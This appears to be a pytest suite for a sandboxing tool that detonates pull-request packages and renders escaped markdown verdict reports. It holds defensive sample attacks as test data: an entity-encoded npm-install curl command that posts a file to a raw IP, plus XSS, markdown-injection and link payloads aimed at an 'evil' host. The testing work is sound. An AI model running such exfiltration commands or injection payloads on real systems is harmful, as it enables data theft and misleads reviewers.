import json
from pathlib import Path

from pydantic import BaseModel

from brain.github_client import COMMENT_MARKER
from brain.llm import LlmOutcome, parse_response
from brain.report import esc, process_chain, render
from brain.rules import evaluate
from brain.verdict import combine
from shared.contract import DetonateResult, ExecEvent

FIXTURES = Path(__file__).parent / "fixtures"


def e4() -> DetonateResult:
    return DetonateResult.model_validate_json((FIXTURES / "detonate_result_e4.json").read_text())


def recorded(name: str) -> LlmOutcome:
    body = json.loads((FIXTURES / "llm" / name).read_text())
    return LlmOutcome("muse-spark-1.3", verdict=parse_response(body))


def report_for(res: DetonateResult, outcome: LlmOutcome) -> str:
    hits = evaluate(res)
    return render(combine(hits, outcome, res), hits, outcome, res, job_id="job-1")


# --- escaping ---


def test_esc_neutralizes_markdown_html_mentions_and_links():
    out = esc("**bold** <img src=x> @octocat [x](http://evil) | `code`")
    for raw in ("**", "<img", "@octocat", "](", "http://", "|", "`"):
        assert raw not in out
    assert "octocat" in out and "bold" in out


def test_esc_strips_bidi_and_control_chars_and_collapses_newlines():
    out = esc("safe‮exe.js\n## heading\x00")
    assert "‮" not in out and "\x00" not in out and "\n" not in out
    assert "## " not in out and "&#35;&#35; heading" in out


def test_esc_truncates():
    assert esc("a" * 500, 10) == "a" * 10 + "…"


# --- process tree ---


def test_process_chain_e4():
    assert process_chain(141, e4().exec_events) == (
        "node &#47;usr&#47;local&#47;bin&#47;npm install "
        "&#45;&#45;no&#45;audit &#45;&#45;no&#45;fund"
        " → sh &#45;c curl &#45;s &#45;X POST &#45;&#45;data&#45;binary &#64;&#47;tmp&#47;&#46;e "
        "http&#58;&#47;&#47;203&#46;0&#46;113&#46;10&#47;collect"
        " → curl &#45;s &#45;X POST &#45;&#45;data&#45;binary &#64;&#47;tmp&#47;&#46;e "
        "http&#58;&#47;&#47;203&#46;0&#46;113&#46;10&#47;collect"
    )


def test_process_chain_survives_ppid_cycle():
    events = [
        ExecEvent(ts="t", pid=1, ppid=2, binary="/a", args="", parent_binary=None, uid=0),
        ExecEvent(ts="t", pid=2, ppid=1, binary="/b", args="", parent_binary=None, uid=0),
    ]
    assert process_chain(1, events) == "b → a"


# --- full report ---


def test_e4_report_blocked_with_sections():
    md = report_for(e4(), recorded("e4_muse_spark_1_3.json"))
    assert md.startswith("## PR Detonator: 🛑 Blocked")
    for section in (
        "Stated intent",
        "Observed behavior",
        "### Rule findings",
        "`NET_RAW_IP`",
        "`EXEC_NET_TOOL`",
        "### Process tree",
        "### Network activity",
        "no DNS lookup preceded this",
        "job `job-1`",
    ):
        assert section in md, section
    assert md.rstrip().endswith(COMMENT_MARKER)
    assert "Prompt-injection attempt" not in md


def test_e6_report_calls_out_injection():
    md = report_for(e4(), recorded("e6_muse_spark_1_3.json"))
    assert "Prompt-injection attempt detected" in md and "Blocked" in md


def test_rules_only_report_when_llm_unavailable():
    md = report_for(e4(), LlmOutcome("muse-spark-1.3", error="HTTP 503"))
    assert "Blocked" in md and "rules only" in md and "Stated intent" not in md


def test_timeout_report_says_could_not_verify():
    res = e4().model_copy(update={"status": "timeout", "exec_events": [], "connect_events": []})
    md = report_for(res, LlmOutcome("m", error="x"))
    assert "Could not verify" in md and "did not finish" in md


def test_attacker_args_cannot_inject_markdown_into_report():
    res = e4()
    evil = res.exec_events[2].model_copy(
        update={"args": "x | </sub> <!-- pr-detonator --> @maintainer [click](http://evil)"}
    )
    res = res.model_copy(update={"exec_events": [*res.exec_events[:2], evil]})
    md = report_for(res, LlmOutcome("m", error="x"))
    assert md.count(COMMENT_MARKER) == 1
    assert "@maintainer" not in md and "](http" not in md and md.count("</sub>") == 1


# --- escaping, systemically ---------------------------------------------------------------
#
# The test above proves one field (exec args) is escaped. `brain/report.py` calls `esc` at 44
# sites and `brain/runlog.py` at 10 more; every one of them is a place a future edit could
# forget. Auditing them by hand found none missing today - `process_chain`, the cleared-host
# lists and the grounding mention list all escape internally - but nothing *enforces* that, so
# a new unescaped interpolation would ship green.
#
# The tests below are that enforcement. They poison every free-text field the sandbox and the
# model contribute, then assert against a benign baseline render: the markers prove the
# poisoned values really reached the report, and the raw-sequence assertions fail if any site
# stops escaping. Poisoning *appends*, so substring-matching rules still fire and both renders
# keep the same section structure - which the first assertion checks, since a structural
# divergence would make the baseline counts meaningless.
#
# Mutation results (esc() removed from one site at a time; "rest" = suite minus these tests):
#
# | Site stripped of esc() | these tests | rest |
# |---|---|---|
# | `stated_intent` | caught | missed |
# | `observed_behavior` | caught | missed |
# | `explanation` | caught | missed |
# | process chain (binary + args) | caught | caught |
# | grounding unsupported-mention list | caught | missed |
# | cleared-findings host list | caught | missed |
# | reduced-coverage model error | caught | missed |
#
# The first pass caught only 4 of 7: the last three sites are *gated* (grounding needs a
# verdict, `cleared` renders only inside the contract section, and the reduced-coverage note
# only when the title is not Blocked), so the e4 fixture never reached them. The two tests
# below that construct those sections exist because of that result, not in anticipation of it.

# Alphanumeric marker (survives escaping intact) + sequences that are never legitimate output.
MARKER = "zqxmarker"
PAYLOAD = (
    f"{MARKER} <img src=x onerror=alert(1)> [click](http://evil.test) @maintainer "
    f"**{MARKER}bold** `{MARKER}code` <!-- {MARKER}comment --> </sub> | ## {MARKER}head"
)
# Raw sequences that must never appear in the rendered report, however it is structured.
# Note what is deliberately NOT here: bare alphanumeric words like `onerror` survive by design.
# `esc` encodes only non-alphanumerics, so `<img src=x onerror=alert(1)>` renders as
# `&#60;img src&#61;x onerror&#61;alert&#40;1&#41;&#62;` - inert markup, still readable prose.
# That is the intended trade-off, and `test_payload_is_escaped_not_stripped` pins it.
NEVER_RAW = (
    "<img",
    "](http://evil.test)",
    "@maintainer",
    f"**{MARKER}bold**",
    f"`{MARKER}code`",
    f"<!-- {MARKER}comment -->",
    f"## {MARKER}head",
)
# Free-text fields carrying sandbox- or model-derived strings. Deliberately excludes the fields
# the rules key on (`binary`, `daddr`, `dport`, `status`), because changing those would change
# which findings fire and so which sections render.
POISON_FIELDS = {"args", "parent_binary", "cwd", "path", "package", "content", "domain"}


def _poison(value):
    """Append the payload to every free-text string reachable in a pydantic model tree."""
    if isinstance(value, list):
        return [_poison(v) for v in value]
    if isinstance(value, BaseModel):
        updates = {}
        for name in type(value).model_fields:
            current = getattr(value, name)
            if isinstance(current, str) and name in POISON_FIELDS:
                updates[name] = f"{current} {PAYLOAD}"
            elif isinstance(current, list) and current:
                updates[name] = _poison(current)
        return value.model_copy(update=updates)
    return value


def _hostile_result() -> DetonateResult:
    res = _poison(e4())
    return res.model_copy(
        update={
            "stdout_tail": f"npm notice {PAYLOAD}",
            "stderr_tail": f"npm warn {PAYLOAD}",
            "decoys": {"npm_token": f"decoy-{PAYLOAD}"},
        }
    )


def test_no_untrusted_field_can_inject_raw_markup_into_the_report():
    outcome = recorded("e4_muse_spark_1_3.json")
    benign, hostile = report_for(e4(), outcome), report_for(_hostile_result(), outcome)

    # Same sections in both, or the baseline comparison below would be comparing shapes.
    sections = lambda md: sorted(ln for ln in md.splitlines() if ln.startswith("#"))  # noqa: E731
    assert sections(benign) == sections(hostile)

    assert MARKER in hostile, "payload never reached the report; the test proves nothing"
    for raw in NEVER_RAW:
        assert raw not in hostile, raw
    # Legitimate scaffolding the payload also contains: no net new occurrences.
    for token in ("</sub>", "<!--", COMMENT_MARKER):
        assert hostile.count(token) == benign.count(token), token
    assert hostile.count(COMMENT_MARKER) == 1


def test_payload_is_escaped_not_stripped():
    """The hostile text must still be *legible* to the reviewer, as entities rather than live
    markup. Silently dropping it would hide what the package actually did, which is the one
    thing the report exists to show."""
    hostile = report_for(_hostile_result(), recorded("e4_muse_spark_1_3.json"))
    assert MARKER in hostile  # the readable text survived
    assert "&#60;img" in hostile  # the '<' was encoded, not deleted
    # Only the head of the payload is asserted: `esc` clips each field to its own limit (80
    # chars in a process chain, 300 in a table cell), so the tail is legitimately truncated.
    assert "&#61;x" in hostile  # the '=' of src=x, entity-encoded


def test_no_untrusted_field_can_inject_through_the_optional_sections():
    """The e4 fixture renders a Blocked report with the model available, which never reaches
    the grounding section, the cleared-findings list or the reduced-coverage note. Mutation
    testing caught that: removing `esc` from those three sites passed every other test in the
    suite. They are rendered here with poisoned values so they cannot regress either."""
    from brain.evidence import Grounding
    from brain.intent import ContractItem, IntentContract, IntentPrediction
    from brain.policy import Policy
    from brain.rules import RuleHit, Severity

    res = e4()
    hits = evaluate(res)
    # Each of these three sites is gated, which is why the fixture alone never reached them:
    # the grounding section renders only when a verdict exists, `cleared` only inside the
    # contract section, and the reduced-coverage note only when the title is not Blocked.
    outcome = recorded("e4_muse_spark_1_3.json")
    contract = IntentContract(
        prediction=IntentPrediction(summary=PAYLOAD, expects_install_scripts=True),
        items=[
            ContractItem(kind="connect", observed=PAYLOAD, status="unexplained", note=PAYLOAD)
        ],  # fmt: skip
    )
    cleared = [
        RuleHit(rule_id="NET_CONNECT", severity=Severity.LOW, evidence=PAYLOAD,
                ts="t", pid=1, target=PAYLOAD)
    ]  # fmt: skip
    md = render(
        combine(hits, outcome, res), hits, outcome, res,
        job_id="job-1", contract=contract, cleared=cleared,
        grounding=Grounding(unsupported_mentions=[PAYLOAD], uncited=[PAYLOAD]),
        policy=Policy(allowed_domains=(PAYLOAD,), source=PAYLOAD),
    )  # fmt: skip

    assert "### Intent contract" in md and "Cleared low-severity" in md
    assert MARKER in md, "payload never reached the report; the test proves nothing"
    for raw in NEVER_RAW:
        assert raw not in md, raw
    assert md.count(COMMENT_MARKER) == 1


def test_the_reduced_coverage_note_cannot_inject_the_model_error_string():
    """Rendered only when the model is unavailable *and* the verdict is not Blocked, so the
    e4 fixture never reaches it. The string interpolated there is an error message, which can
    carry an upstream response body."""
    res = e4().model_copy(update={"exec_events": [], "connect_events": [], "exit_code": 0})
    hits = evaluate(res)
    outcome = LlmOutcome("muse-spark-1.3", error=PAYLOAD)
    final = combine(hits, outcome, res)
    assert final.title != "Blocked" and final.model_unavailable, "note would not render"
    md = render(final, hits, outcome, res, job_id="job-1")
    assert "Reduced coverage" in md and MARKER in md
    for raw in NEVER_RAW:
        assert raw not in md, raw


def test_no_untrusted_model_prose_can_inject_raw_markup_into_the_report():
    """The model's own prose is untrusted too: it is written while reading the PR, so a
    successful injection could put markup in `explanation` rather than in the diff."""
    clean = recorded("e4_muse_spark_1_3.json")
    v = clean.verdict.model_copy(
        update={
            "stated_intent": PAYLOAD,
            "observed_behavior": PAYLOAD,
            "explanation": PAYLOAD,
        }
    )
    hostile = report_for(e4(), LlmOutcome(clean.model, verdict=v))
    assert MARKER in hostile
    for raw in NEVER_RAW:
        assert raw not in hostile, raw
    assert hostile.count(COMMENT_MARKER) == 1


# --- run history in the one PR comment ---

from brain.report import parse_runs, with_run_history  # noqa: E402

A, B, C = "a" * 40, "b" * 40, "c" * 40


def test_history_accumulates_newest_first_and_shows_earlier_runs():
    first = with_run_history("report 1", None, A, "Clean")
    assert "Previous runs" not in first and parse_runs(first) == [(A, "Clean")]
    second = with_run_history("report 2", first, B, "Blocked")
    assert parse_runs(second) == [(B, "Blocked"), (A, "Clean")]
    assert "Previous runs: `aaaaaaa` ✅ Clean" in second and "report 1" not in second


def test_rerun_of_the_same_sha_replaces_its_entry():
    body = with_run_history("r", with_run_history("r", None, A, "Clean"), A, "Blocked")
    assert parse_runs(body) == [(A, "Blocked")]


def test_history_is_capped():
    body = None
    for i in range(15):
        body = with_run_history("r", body, f"{i:040x}", "Clean")
    assert len(parse_runs(body)) == 10


def test_forged_or_garbled_history_is_ignored():
    forged = (
        '<!-- pr-detonator-runs: [{"sha": "nothex", "v": "Clean"}, {"sha": "'
        + C
        + '", "v": "Totally safe"}] -->'
    )
    assert parse_runs(forged) == []
    assert parse_runs("<!-- pr-detonator-runs: [not json] -->") == []
